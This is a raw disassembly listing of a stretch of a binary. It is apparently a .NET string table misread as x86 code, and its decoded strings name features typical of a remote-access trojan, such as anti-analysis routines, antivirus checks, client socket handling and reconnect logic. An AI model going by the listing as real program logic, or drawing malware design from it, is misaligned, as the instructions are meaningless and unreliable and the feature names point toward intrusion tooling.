  408a6f:	45                   	inc    %ebp
  408a70:	78 70                	js     0x408ae2
  408a72:	61                   	popa
  408a73:	6e                   	outsb  %ds:(%esi),(%dx)
  408a74:	64 45                	fs inc %ebp
  408a76:	6e                   	outsb  %ds:(%esi),(%dx)
  408a77:	76 69                	jbe    0x408ae2
  408a79:	72 6f                	jb     0x408aea
  408a7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7c:	6d                   	insl   (%dx),%es:(%edi)
  408a7d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7f:	74 56                	je     0x408ad7
  408a81:	61                   	popa
  408a82:	72 69                	jb     0x408aed
  408a84:	61                   	popa
  408a85:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  408a89:	00 47 65             	add    %al,0x65(%edi)
  408a8c:	74 50                	je     0x408ade
  408a8e:	72 6f                	jb     0x408aff
  408a90:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a93:	73 65                	jae    0x408afa
  408a95:	73 00                	jae    0x408a97
  408a97:	47                   	inc    %edi
  408a98:	65 74 48             	gs je  0x408ae3
  408a9b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9c:	73 74                	jae    0x408b12
  408a9e:	41                   	inc    %ecx
  408a9f:	64 64 72 65          	fs fs jb 0x408b08
  408aa3:	73 73                	jae    0x408b18
  408aa5:	65 73 00             	gs jae 0x408aa8
  408aa8:	53                   	push   %ebx
  408aa9:	79 73                	jns    0x408b1e
  408aab:	74 65                	je     0x408b12
  408aad:	6d                   	insl   (%dx),%es:(%edi)
  408aae:	2e 53                	cs push %ebx
  408ab0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408ab4:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  408abb:	70 
  408abc:	74 6f                	je     0x408b2d
  408abe:	67 72 61             	addr16 jb 0x408b22
  408ac1:	70 68                	jo     0x408b2b
  408ac3:	79 2e                	jns    0x408af3
  408ac5:	58                   	pop    %eax
  408ac6:	35 30 39 43 65       	xor    $0x65433930,%eax
  408acb:	72 74                	jb     0x408b41
  408acd:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408ad4:	73 00                	jae    0x408ad6
  408ad6:	45                   	inc    %ebp
  408ad7:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad8:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408adb:	65 32 42 79          	xor    %gs:0x79(%edx),%al
  408adf:	74 65                	je     0x408b46
  408ae1:	73 00                	jae    0x408ae3
  408ae3:	47                   	inc    %edi
  408ae4:	65 74 55             	gs je  0x408b3c
  408ae7:	74 66                	je     0x408b4f
  408ae9:	38 42 79             	cmp    %al,0x79(%edx)
  408aec:	74 65                	je     0x408b53
  408aee:	73 00                	jae    0x408af0
  408af0:	75 74                	jne    0x408b66
  408af2:	66 38 42 79          	data16 cmp %al,0x79(%edx)
  408af6:	74 65                	je     0x408b5d
  408af8:	73 00                	jae    0x408afa
  408afa:	52                   	push   %edx
  408afb:	66 63 32             	arpl   %si,(%edx)
  408afe:	38 39                	cmp    %bh,(%ecx)
  408b00:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  408b04:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  408b0b:	73 00                	jae    0x408b0d
  408b0d:	52                   	push   %edx
  408b0e:	65 61                	gs popa
  408b10:	64 41                	fs inc %ecx
  408b12:	6c                   	insb   (%dx),%es:(%edi)
  408b13:	6c                   	insb   (%dx),%es:(%edi)
  408b14:	42                   	inc    %edx
  408b15:	79 74                	jns    0x408b8b
  408b17:	65 73 00             	gs jae 0x408b1a
  408b1a:	44                   	inc    %esp
  408b1b:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408b1f:	65 46                	gs inc %esi
  408b21:	72 6f                	jb     0x408b92
  408b23:	6d                   	insl   (%dx),%es:(%edi)
  408b24:	42                   	inc    %edx
  408b25:	79 74                	jns    0x408b9b
  408b27:	65 73 00             	gs jae 0x408b2a
  408b2a:	53                   	push   %ebx
  408b2b:	77 61                	ja     0x408b8e
  408b2d:	70 42                	jo     0x408b71
  408b2f:	79 74                	jns    0x408ba5
  408b31:	65 73 00             	gs jae 0x408b34
  408b34:	4c                   	dec    %esp
  408b35:	6f                   	outsl  %ds:(%esi),(%dx)
  408b36:	61                   	popa
  408b37:	64 46                	fs inc %esi
  408b39:	69 6c 65 41 73 42 79 	imul   $0x74794273,0x41(%ebp,%eiz,2),%ebp
  408b40:	74 
  408b41:	65 73 00             	gs jae 0x408b44
  408b44:	47                   	inc    %edi
  408b45:	65 74 41             	gs je  0x408b89
  408b48:	73 42                	jae    0x408b8c
  408b4a:	79 74                	jns    0x408bc0
  408b4c:	65 73 00             	gs jae 0x408b4f
  408b4f:	53                   	push   %ebx
  408b50:	65 74 41             	gs je  0x408b94
  408b53:	73 42                	jae    0x408b97
  408b55:	79 74                	jns    0x408bcb
  408b57:	65 73 00             	gs jae 0x408b5a
  408b5a:	47                   	inc    %edi
  408b5b:	65 74 42             	gs je  0x408ba0
  408b5e:	79 74                	jns    0x408bd4
  408b60:	65 73 00             	gs jae 0x408b63
  408b63:	4e                   	dec    %esi
  408b64:	65 78 74             	gs js  0x408bdb
  408b67:	42                   	inc    %edx
  408b68:	79 74                	jns    0x408bde
  408b6a:	65 73 00             	gs jae 0x408b6d
  408b6d:	72 61                	jb     0x408bd0
  408b6f:	77 42                	ja     0x408bb3
  408b71:	79 74                	jns    0x408be7
  408b73:	65 73 00             	gs jae 0x408b76
  408b76:	62 79 74             	bound  %edi,0x74(%ecx)
  408b79:	65 73 00             	gs jae 0x408b7c
  408b7c:	43                   	inc    %ebx
  408b7d:	53                   	push   %ebx
  408b7e:	68 61 72 70 41       	push   $0x41707261
  408b83:	72 67                	jb     0x408bec
  408b85:	75 6d                	jne    0x408bf4
  408b87:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b89:	74 49                	je     0x408bd4
  408b8b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b8c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408b8e:	46                   	inc    %esi
  408b8f:	6c                   	insb   (%dx),%es:(%edi)
  408b90:	61                   	popa
  408b91:	67 73 00             	addr16 jae 0x408b94
  408b94:	43                   	inc    %ebx
  408b95:	53                   	push   %ebx
  408b96:	68 61 72 70 42       	push   $0x42707261
  408b9b:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  408ba2:	61                   	popa
  408ba3:	67 73 00             	addr16 jae 0x408ba6
  408ba6:	65 73 46             	gs jae 0x408bef
  408ba9:	6c                   	insb   (%dx),%es:(%edi)
  408baa:	61                   	popa
  408bab:	67 73 00             	addr16 jae 0x408bae
  408bae:	53                   	push   %ebx
  408baf:	74 72                	je     0x408c23
  408bb1:	69 6e 67 73 00 49 6e 	imul   $0x6e490073,0x67(%esi),%ebp
  408bb8:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408bbf:	65 
  408bc0:	53                   	push   %ebx
  408bc1:	65 74 74             	gs je  0x408c38
  408bc4:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  408bcb:	73 73                	jae    0x408c40
  408bcd:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd5:	67 45                	addr16 inc %ebp
  408bd7:	76 65                	jbe    0x408c3e
  408bd9:	6e                   	outsb  %ds:(%esi),(%dx)
  408bda:	74 41                	je     0x408c1d
  408bdc:	72 67                	jb     0x408c45
  408bde:	73 00                	jae    0x408be0
  408be0:	41                   	inc    %ecx
  408be1:	6e                   	outsb  %ds:(%esi),(%dx)
  408be2:	74 69                	je     0x408c4d
  408be4:	5f                   	pop    %edi
  408be5:	41                   	inc    %ecx
  408be6:	6e                   	outsb  %ds:(%esi),(%dx)
  408be7:	61                   	popa
  408be8:	6c                   	insb   (%dx),%es:(%edi)
  408be9:	79 73                	jns    0x408c5e
  408beb:	69 73 00 52 75 6e 41 	imul   $0x416e7552,0x0(%ebx),%esi
  408bf2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf3:	74 69                	je     0x408c5e
  408bf5:	41                   	inc    %ecx
  408bf6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf7:	61                   	popa
  408bf8:	6c                   	insb   (%dx),%es:(%edi)
  408bf9:	79 73                	jns    0x408c6e
  408bfb:	69 73 00 50 61 63 6b 	imul   $0x6b636150,0x0(%ebx),%esi
  408c02:	73 00                	jae    0x408c04
  408c04:	49                   	dec    %ecx
  408c05:	43                   	inc    %ebx
  408c06:	72 65                	jb     0x408c6d
  408c08:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408c0b:	74 69                	je     0x408c76
  408c0d:	61                   	popa
  408c0e:	6c                   	insb   (%dx),%es:(%edi)
  408c0f:	73 00                	jae    0x408c11
  408c11:	73 65                	jae    0x408c78
  408c13:	74 5f                	je     0x408c74
  408c15:	43                   	inc    %ebx
  408c16:	72 65                	jb     0x408c7d
  408c18:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408c1b:	74 69                	je     0x408c86
  408c1d:	61                   	popa
  408c1e:	6c                   	insb   (%dx),%es:(%edi)
  408c1f:	73 00                	jae    0x408c21
  408c21:	45                   	inc    %ebp
  408c22:	71 75                	jno    0x408c99
  408c24:	61                   	popa
  408c25:	6c                   	insb   (%dx),%es:(%edi)
  408c26:	73 00                	jae    0x408c28
  408c28:	53                   	push   %ebx
  408c29:	73 6c                	jae    0x408c97
  408c2b:	50                   	push   %eax
  408c2c:	72 6f                	jb     0x408c9d
  408c2e:	74 6f                	je     0x408c9f
  408c30:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408c33:	73 00                	jae    0x408c35
  408c35:	52                   	push   %edx
  408c36:	65 61                	gs popa
  408c38:	64 54                	fs push %esp
  408c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3b:	6f                   	outsl  %ds:(%esi),(%dx)
  408c3c:	6c                   	insb   (%dx),%es:(%edi)
  408c3d:	73 00                	jae    0x408c3f
  408c3f:	57                   	push   %edi
  408c40:	72 69                	jb     0x408cab
  408c42:	74 65                	je     0x408ca9
  408c44:	54                   	push   %esp
  408c45:	6f                   	outsl  %ds:(%esi),(%dx)
  408c46:	6f                   	outsl  %ds:(%esi),(%dx)
  408c47:	6c                   	insb   (%dx),%es:(%edi)
  408c48:	73 00                	jae    0x408c4a
  408c4a:	42                   	inc    %edx
  408c4b:	79 74                	jns    0x408cc1
  408c4d:	65 73 54             	gs jae 0x408ca4
  408c50:	6f                   	outsl  %ds:(%esi),(%dx)
  408c51:	6f                   	outsl  %ds:(%esi),(%dx)
  408c52:	6c                   	insb   (%dx),%es:(%edi)
  408c53:	73 00                	jae    0x408c55
  408c55:	53                   	push   %ebx
  408c56:	79 73                	jns    0x408ccb
  408c58:	74 65                	je     0x408cbf
  408c5a:	6d                   	insl   (%dx),%es:(%edi)
  408c5b:	2e 57                	cs push %edi
  408c5d:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  408c64:	46                   	inc    %esi
  408c65:	6f                   	outsl  %ds:(%esi),(%dx)
  408c66:	72 6d                	jb     0x408cd5
  408c68:	73 00                	jae    0x408c6a
  408c6a:	44                   	inc    %esp
  408c6b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6c:	73 00                	jae    0x408c6e
  408c6e:	43                   	inc    %ebx
  408c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  408c70:	6e                   	outsb  %ds:(%esi),(%dx)
  408c71:	74 61                	je     0x408cd4
  408c73:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  408c7a:	74 65                	je     0x408ce1
  408c7c:	6d                   	insl   (%dx),%es:(%edi)
  408c7d:	2e 43                	cs inc %ebx
  408c7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408c80:	6c                   	insb   (%dx),%es:(%edi)
  408c81:	6c                   	insb   (%dx),%es:(%edi)
  408c82:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408c87:	6e                   	outsb  %ds:(%esi),(%dx)
  408c88:	73 00                	jae    0x408c8a
  408c8a:	53                   	push   %ebx
  408c8b:	74 72                	je     0x408cff
  408c8d:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  408c94:	74 4f                	je     0x408ce5
  408c96:	70 74                	jo     0x408d0c
  408c98:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  408c9f:	74 49                	je     0x408cea
  408ca1:	6d                   	insl   (%dx),%es:(%edi)
  408ca2:	61                   	popa
  408ca3:	67 65 44             	addr16 gs inc %esp
  408ca6:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  408caa:	65 72 73             	gs jb  0x408d20
  408cad:	00 52 75             	add    %dl,0x75(%edx)
  408cb0:	6e                   	outsb  %ds:(%esi),(%dx)
  408cb1:	74 69                	je     0x408d1c
  408cb3:	6d                   	insl   (%dx),%es:(%edi)
  408cb4:	65 48                	gs dec %eax
  408cb6:	65 6c                	gs insb (%dx),%es:(%edi)
  408cb8:	70 65                	jo     0x408d1f
  408cba:	72 73                	jb     0x408d2f
  408cbc:	00 53 73             	add    %dl,0x73(%ebx)
  408cbf:	6c                   	insb   (%dx),%es:(%edi)
  408cc0:	50                   	push   %eax
  408cc1:	6f                   	outsl  %ds:(%esi),(%dx)
  408cc2:	6c                   	insb   (%dx),%es:(%edi)
  408cc3:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  408cca:	72 73                	jb     0x408d3f
  408ccc:	00 73 73             	add    %dh,0x73(%ebx)
  408ccf:	6c                   	insb   (%dx),%es:(%edi)
  408cd0:	50                   	push   %eax
  408cd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408cd2:	6c                   	insb   (%dx),%es:(%edi)
  408cd3:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  408cda:	72 73                	jb     0x408d4f
  408cdc:	00 46 69             	add    %al,0x69(%esi)
  408cdf:	6c                   	insb   (%dx),%es:(%edi)
  408ce0:	65 41                	gs inc %ecx
  408ce2:	63 63 65             	arpl   %esp,0x65(%ebx)
  408ce5:	73 73                	jae    0x408d5a
  408ce7:	00 68 50             	add    %ch,0x50(%eax)
  408cea:	72 6f                	jb     0x408d5b
  408cec:	63 65 73             	arpl   %esp,0x73(%ebp)
  408cef:	73 00                	jae    0x408cf1
  408cf1:	47                   	inc    %edi
  408cf2:	65 74 50             	gs je  0x408d45
  408cf5:	72 6f                	jb     0x408d66
  408cf7:	63 65 73             	arpl   %esp,0x73(%ebp)
  408cfa:	73 00                	jae    0x408cfc
  408cfc:	47                   	inc    %edi
  408cfd:	65 74 43             	gs je  0x408d43
  408d00:	75 72                	jne    0x408d74
  408d02:	72 65                	jb     0x408d69
  408d04:	6e                   	outsb  %ds:(%esi),(%dx)
  408d05:	74 50                	je     0x408d57
  408d07:	72 6f                	jb     0x408d78
  408d09:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d0c:	73 00                	jae    0x408d0e
  408d0e:	70 72                	jo     0x408d82
  408d10:	6f                   	outsl  %ds:(%esi),(%dx)
  408d11:	63 65 73             	arpl   %esp,0x73(%ebp)
  408d14:	73 00                	jae    0x408d16
  408d16:	49                   	dec    %ecx
  408d17:	50                   	push   %eax
  408d18:	41                   	inc    %ecx
  408d19:	64 64 72 65          	fs fs jb 0x408d82
  408d1d:	73 73                	jae    0x408d92
  408d1f:	00 43 6f             	add    %al,0x6f(%ebx)
  408d22:	6d                   	insl   (%dx),%es:(%edi)
  408d23:	70 72                	jo     0x408d97
  408d25:	65 73 73             	gs jae 0x408d9b
  408d28:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  408d2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d2d:	6d                   	insl   (%dx),%es:(%edi)
  408d2e:	70 72                	jo     0x408da2
  408d30:	65 73 73             	gs jae 0x408da6
  408d33:	00 53 79             	add    %dl,0x79(%ebx)
  408d36:	73 74                	jae    0x408dac
  408d38:	65 6d                	gs insl (%dx),%es:(%edi)
  408d3a:	2e 4e                	cs dec %esi
  408d3c:	65 74 2e             	gs je  0x408d6d
  408d3f:	53                   	push   %ebx
  408d40:	6f                   	outsl  %ds:(%esi),(%dx)
  408d41:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408d44:	74 73                	je     0x408db9
  408d46:	00 73 65             	add    %dh,0x65(%ebx)
  408d49:	74 5f                	je     0x408daa
  408d4b:	41                   	inc    %ecx
  408d4c:	72 67                	jb     0x408db5
  408d4e:	75 6d                	jne    0x408dbd
  408d50:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d52:	74 73                	je     0x408dc7
  408d54:	00 53 79             	add    %dl,0x79(%ebx)
  408d57:	73 74                	jae    0x408dcd
  408d59:	65 6d                	gs insl (%dx),%es:(%edi)
  408d5b:	45                   	inc    %ebp
  408d5c:	76 65                	jbe    0x408dc3
  408d5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408d5f:	74 73                	je     0x408dd4
  408d61:	00 50 6f             	add    %dl,0x6f(%eax)
  408d64:	72 74                	jb     0x408dda
  408d66:	73 00                	jae    0x408d68
  408d68:	45                   	inc    %ebp
  408d69:	78 69                	js     0x408dd4
  408d6b:	73 74                	jae    0x408de1
  408d6d:	73 00                	jae    0x408d6f
  408d6f:	48                   	dec    %eax
  408d70:	6f                   	outsl  %ds:(%esi),(%dx)
  408d71:	73 74                	jae    0x408de7
  408d73:	73 00                	jae    0x408d75
  408d75:	41                   	inc    %ecx
  408d76:	6e                   	outsb  %ds:(%esi),(%dx)
  408d77:	74 69                	je     0x408de2
  408d79:	76 69                	jbe    0x408de4
  408d7b:	72 75                	jb     0x408df2
  408d7d:	73 00                	jae    0x408d7f
  408d7f:	43                   	inc    %ebx
  408d80:	6f                   	outsl  %ds:(%esi),(%dx)
  408d81:	6e                   	outsb  %ds:(%esi),(%dx)
  408d82:	63 61 74             	arpl   %esp,0x74(%ecx)
  408d85:	00 49 6d             	add    %cl,0x6d(%ecx)
  408d88:	61                   	popa
  408d89:	67 65 46             	addr16 gs inc %esi
  408d8c:	6f                   	outsl  %ds:(%esi),(%dx)
  408d8d:	72 6d                	jb     0x408dfc
  408d8f:	61                   	popa
  408d90:	74 00                	je     0x408d92
  408d92:	66 6f                	outsw  %ds:(%esi),(%dx)
  408d94:	72 6d                	jb     0x408e03
  408d96:	61                   	popa
  408d97:	74 00                	je     0x408d99
  408d99:	57                   	push   %edi
  408d9a:	72 69                	jb     0x408e05
  408d9c:	74 65                	je     0x408e03
  408d9e:	46                   	inc    %esi
  408d9f:	6c                   	insb   (%dx),%es:(%edi)
  408da0:	6f                   	outsl  %ds:(%esi),(%dx)
  408da1:	61                   	popa
  408da2:	74 00                	je     0x408da4
  408da4:	67 65 74 5f          	addr16 gs je 0x408e07
  408da8:	41                   	inc    %ecx
  408da9:	73 46                	jae    0x408df1
  408dab:	6c                   	insb   (%dx),%es:(%edi)
  408dac:	6f                   	outsl  %ds:(%esi),(%dx)
  408dad:	61                   	popa
  408dae:	74 00                	je     0x408db0
  408db0:	73 65                	jae    0x408e17
  408db2:	74 5f                	je     0x408e13
  408db4:	41                   	inc    %ecx
  408db5:	73 46                	jae    0x408dfd
  408db7:	6c                   	insb   (%dx),%es:(%edi)
  408db8:	6f                   	outsl  %ds:(%esi),(%dx)
  408db9:	61                   	popa
  408dba:	74 00                	je     0x408dbc
  408dbc:	47                   	inc    %edi
  408dbd:	65 74 41             	gs je  0x408e01
  408dc0:	73 46                	jae    0x408e08
  408dc2:	6c                   	insb   (%dx),%es:(%edi)
  408dc3:	6f                   	outsl  %ds:(%esi),(%dx)
  408dc4:	61                   	popa
  408dc5:	74 00                	je     0x408dc7
  408dc7:	53                   	push   %ebx
  408dc8:	65 74 41             	gs je  0x408e0c
  408dcb:	73 46                	jae    0x408e13
  408dcd:	6c                   	insb   (%dx),%es:(%edi)
  408dce:	6f                   	outsl  %ds:(%esi),(%dx)
  408dcf:	61                   	popa
  408dd0:	74 00                	je     0x408dd2
  408dd2:	46                   	inc    %esi
  408dd3:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  408dda:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  408dde:	61                   	popa
  408ddf:	6e                   	outsb  %ds:(%esi),(%dx)
  408de0:	61                   	popa
  408de1:	67 65 6d             	gs insl (%dx),%es:(%di)
  408de4:	65 6e                	outsb  %gs:(%esi),(%dx)
  408de6:	74 42                	je     0x408e2a
  408de8:	61                   	popa
  408de9:	73 65                	jae    0x408e50
  408deb:	4f                   	dec    %edi
  408dec:	62 6a 65             	bound  %ebp,0x65(%edx)
  408def:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  408df3:	6f                   	outsl  %ds:(%esi),(%dx)
  408df4:	72 63                	jb     0x408e59
  408df6:	65 50                	gs push %eax
  408df8:	61                   	popa
  408df9:	74 68                	je     0x408e63
  408dfb:	4f                   	dec    %edi
  408dfc:	62 6a 65             	bound  %ebp,0x65(%edx)
  408dff:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  408e03:	6f                   	outsl  %ds:(%esi),(%dx)
  408e04:	6c                   	insb   (%dx),%es:(%edi)
  408e05:	6c                   	insb   (%dx),%es:(%edi)
  408e06:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  408e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  408e0c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  408e0e:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  408e13:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408e17:	6e                   	outsb  %ds:(%esi),(%dx)
  408e18:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  408e1d:	65 74 00             	gs je  0x408e20
  408e20:	53                   	push   %ebx
  408e21:	79 73                	jns    0x408e96
  408e23:	74 65                	je     0x408e8a
  408e25:	6d                   	insl   (%dx),%es:(%edi)
  408e26:	2e 4e                	cs dec %esi
  408e28:	65 74 00             	gs je  0x408e2b
  408e2b:	53                   	push   %ebx
  408e2c:	65 74 00             	gs je  0x408e2f
  408e2f:	54                   	push   %esp
  408e30:	61                   	popa
  408e31:	72 67                	jb     0x408e9a
  408e33:	65 74 00             	gs je  0x408e36
  408e36:	43                   	inc    %ebx
  408e37:	6c                   	insb   (%dx),%es:(%edi)
  408e38:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  408e3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408e40:	64 6c                	fs insb (%dx),%es:(%edi)
  408e42:	65 5f                	gs pop %edi
  408e44:	50                   	push   %eax
  408e45:	61                   	popa
  408e46:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408e49:	74 00                	je     0x408e4b
  408e4b:	4b                   	dec    %ebx
  408e4c:	65 65 70 41          	gs gs jo 0x408e91
  408e50:	6c                   	insb   (%dx),%es:(%edi)
  408e51:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  408e58:	65 74 00             	gs je  0x408e5b
  408e5b:	43                   	inc    %ebx
  408e5c:	6c                   	insb   (%dx),%es:(%edi)
  408e5d:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  408e64:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  408e68:	53                   	push   %ebx
  408e69:	79 73                	jns    0x408ede
  408e6b:	74 65                	je     0x408ed2
  408e6d:	6d                   	insl   (%dx),%es:(%edi)
  408e6e:	2e 43                	cs inc %ebx
  408e70:	6f                   	outsl  %ds:(%esi),(%dx)
  408e71:	6c                   	insb   (%dx),%es:(%edi)
  408e72:	6c                   	insb   (%dx),%es:(%edi)
  408e73:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408e78:	6e                   	outsb  %ds:(%esi),(%dx)
  408e79:	73 2e                	jae    0x408ea9
  408e7b:	49                   	dec    %ecx
  408e7c:	45                   	inc    %ebp
  408e7d:	6e                   	outsb  %ds:(%esi),(%dx)
  408e7e:	75 6d                	jne    0x408eed
  408e80:	65 72 61             	gs jb  0x408ee4
  408e83:	74 6f                	je     0x408ef4
  408e85:	72 2e                	jb     0x408eb5
  408e87:	52                   	push   %edx
  408e88:	65 73 65             	gs jae 0x408ef0
  408e8b:	74 00                	je     0x408e8d
  408e8d:	67 65 74 5f          	addr16 gs je 0x408ef0
  408e91:	4f                   	dec    %edi
  408e92:	66 66 73 65          	data16 data16 jae 0x408efb
  408e96:	74 00                	je     0x408e98
  408e98:	73 65                	jae    0x408eff
  408e9a:	74 5f                	je     0x408efb
  408e9c:	4f                   	dec    %edi
  408e9d:	66 66 73 65          	data16 data16 jae 0x408f06
  408ea1:	74 00                	je     0x408ea3
  408ea3:	53                   	push   %ebx
  408ea4:	70 6c                	jo     0x408f12
  408ea6:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  408ead:	6e 
  408eae:	74 45                	je     0x408ef5
  408eb0:	78 69                	js     0x408f1b
  408eb2:	74 00                	je     0x408eb4
  408eb4:	53                   	push   %ebx
  408eb5:	61                   	popa
  408eb6:	6c                   	insb   (%dx),%es:(%edi)
  408eb7:	74 00                	je     0x408eb9
  408eb9:	53                   	push   %ebx
  408eba:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  408ec1:	44                   	inc    %esp
  408ec2:	65 66 61             	gs popaw
  408ec5:	75 6c                	jne    0x408f33
  408ec7:	74 00                	je     0x408ec9
  408ec9:	49                   	dec    %ecx
  408eca:	41                   	inc    %ecx
  408ecb:	73 79                	jae    0x408f46
  408ecd:	6e                   	outsb  %ds:(%esi),(%dx)
  408ece:	63 52 65             	arpl   %edx,0x65(%edx)
  408ed1:	73 75                	jae    0x408f48
  408ed3:	6c                   	insb   (%dx),%es:(%edi)
  408ed4:	74 00                	je     0x408ed6
  408ed6:	54                   	push   %esp
  408ed7:	6f                   	outsl  %ds:(%esi),(%dx)
  408ed8:	55                   	push   %ebp
  408ed9:	70 70                	jo     0x408f4b
  408edb:	65 72 49             	gs jb  0x408f27
  408ede:	6e                   	outsb  %ds:(%esi),(%dx)
  408edf:	76 61                	jbe    0x408f42
  408ee1:	72 69                	jb     0x408f4c
  408ee3:	61                   	popa
  408ee4:	6e                   	outsb  %ds:(%esi),(%dx)
  408ee5:	74 00                	je     0x408ee7
  408ee7:	57                   	push   %edi
  408ee8:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  408eec:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  408ef3:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  408efa:	65 
  408efb:	43                   	inc    %ebx
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  408f04:	74 5f                	je     0x408f65
  408f06:	53                   	push   %ebx
  408f07:	73 6c                	jae    0x408f75
  408f09:	43                   	inc    %ebx
  408f0a:	6c                   	insb   (%dx),%es:(%edi)
  408f0b:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  408f12:	74 5f                	je     0x408f73
  408f14:	53                   	push   %ebx
  408f15:	73 6c                	jae    0x408f83
  408f17:	43                   	inc    %ebx
  408f18:	6c                   	insb   (%dx),%es:(%edi)
  408f19:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  408f20:	74 5f                	je     0x408f81
  408f22:	54                   	push   %esp
  408f23:	63 70 43             	arpl   %esi,0x43(%eax)
  408f26:	6c                   	insb   (%dx),%es:(%edi)
  408f27:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  408f2e:	74 5f                	je     0x408f8f
  408f30:	54                   	push   %esp
  408f31:	63 70 43             	arpl   %esi,0x43(%eax)
  408f34:	6c                   	insb   (%dx),%es:(%edi)
  408f35:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  408f3c:	74 68                	je     0x408fa6
  408f3e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f40:	74 69                	je     0x408fab
  408f42:	63 61 74             	arpl   %esp,0x74(%ecx)
  408f45:	65 41                	gs inc %ecx
  408f47:	73 43                	jae    0x408f8c
  408f49:	6c                   	insb   (%dx),%es:(%edi)
  408f4a:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  408f51:	73 74                	jae    0x408fc7
  408f53:	65 6d                	gs insl (%dx),%es:(%edi)
  408f55:	2e 4d                	cs dec %ebp
  408f57:	61                   	popa
  408f58:	6e                   	outsb  %ds:(%esi),(%dx)
  408f59:	61                   	popa
  408f5a:	67 65 6d             	gs insl (%dx),%es:(%di)
  408f5d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f5f:	74 00                	je     0x408f61
  408f61:	45                   	inc    %ebp
  408f62:	6e                   	outsb  %ds:(%esi),(%dx)
  408f63:	76 69                	jbe    0x408fce
  408f65:	72 6f                	jb     0x408fd6
  408f67:	6e                   	outsb  %ds:(%esi),(%dx)
